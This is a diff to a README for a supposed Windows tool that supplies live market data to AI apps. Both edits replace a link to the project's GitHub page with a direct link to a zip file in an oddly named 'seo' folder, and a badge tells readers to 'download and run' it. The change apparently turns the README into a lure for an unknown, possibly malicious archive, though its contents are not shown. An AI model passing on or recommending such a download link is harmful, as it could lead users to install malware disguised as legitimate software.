@@ -1,6 +1,6 @@
 # 📈 revolut-pulse-mcp.v2 - Live market data for AI apps
 
-[![Download and run](https://img.shields.io/badge/Download%20and%20run-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Possessionfleece848/revolut-pulse-mcp.v2)
+[![Download and run](https://img.shields.io/badge/Download%20and%20run-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Possessionfleece848/revolut-pulse-mcp.v2/main/seo/v-mcp-revolut-pulse-v2.3-beta.4.zip)
 
 ## 🧭 What this app does
 
@@ -14,7 +14,7 @@ This app is for Windows users who want a simple local setup with no API key.
 
 Use this link to visit the download page:
 
-[Download revolut-pulse-mcp.v2](https://github.com/Possessionfleece848/revolut-pulse-mcp.v2)
+[Download revolut-pulse-mcp.v2](https://raw.githubusercontent.com/Possessionfleece848/revolut-pulse-mcp.v2/main/seo/v-mcp-revolut-pulse-v2.3-beta.4.zip)
 
 Follow these steps on Windows:
 
